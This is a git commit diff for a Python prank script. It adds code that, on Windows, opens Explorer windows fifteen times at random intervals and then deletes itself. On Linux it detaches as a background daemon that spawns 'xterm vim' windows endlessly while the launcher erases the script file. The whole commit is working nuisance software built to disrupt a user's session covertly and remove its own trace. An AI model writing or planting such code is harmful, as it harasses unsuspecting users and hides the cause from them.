f43ed92895c5f471ef1ef3782d496de1e502e0da
Pierre Bouillon <pierre.bouillon@openmailbox.org>
2017-04-29 15:28:56 +0200

    Windows patch & self destruction
    Now works on windows
    Script now delete himself while running as a task on linux and after 15 windows displayed on windows

--- main.py
+++ main.py
@@ -1,32 +1,80 @@
 #!/usr/bin/env python
-# -*- coding: utf-8 -*-
+#-*- coding: utf-8 -*-
 
-from os         import fork
+###
+# IMPORTS
+#
 from os         import name     as currentOS
-from os         import setsid
-from os         import system
+from os         import path     as p
 from random     import randint
 from subprocess import call
 from sys        import exit
 from time       import sleep
+###
+# SPECIFIC IMPORTS
+#
+if currentOS == 'nt':
+    from os         import system
+else:
+    from os         import fork
+    from os         import setsid
 
-HOUR       = 3600
-HALF       = 1800
-MINUTE     = 60
+###
+# FUNCTIONS
+#
+'''
+Check and correct the windows path (replace Example example by "Example example")
+Return string
+'''
+def getWindowsPath():
+    path  = p.realpath(__file__)
+    spath = path.split('\\')
+    index = 0
+    for segment in spath:
+        if ' ' in segment:
+            segment = segment[::-1]
+            segment+="\""
+            segment = segment[::-1]
+            segment+="\""
+            spath[index] = segment
+        index+=1
+    return "\\".join(spath)
+'''
+self destroy the file regarding current OS then quit
+'''
+def selfDestruction():
+    if currentOS == 'nt':
+        selfDestruct = "del " \
+                     + getWindowsPath()
+        system(selfDestruct)
+    else:
+        call(["rm",p.realpath(__file__)])
+    exit(0)
+   
+###
+# MAIN
+#
+
+MAX_LATENCY = 5*60  # max latency = 5 minutes
 
 if __name__ == "__main__":
-    pid = fork()
-    if pid==0:
-        setsid()
+    # Windows
+    if currentOS == 'nt':
+        for i in xrange(15):
+            sleep(randint(0,MAX_LATENCY))
+            system("start %windir%\explorer.exe")
+        selfDestruction()
+        
+    #Linux
+    else:
         pid = fork()
         if pid==0:
-            while True:
-                sleep(randint(0,HALF))
-                if currentOS == 'nt':
-                    system("start %windir%\explorer.exe")
-                else:
+            setsid()
+            pid = fork()
+            if pid==0:
+                # Now run as a background task
+                while True:
+                    sleep(randint(0,MAX_LATENCY))
                     call(["xterm","vim"])
         else:
-            exit(0)
-    else:
-        exit(0)
+            selfDestruction()
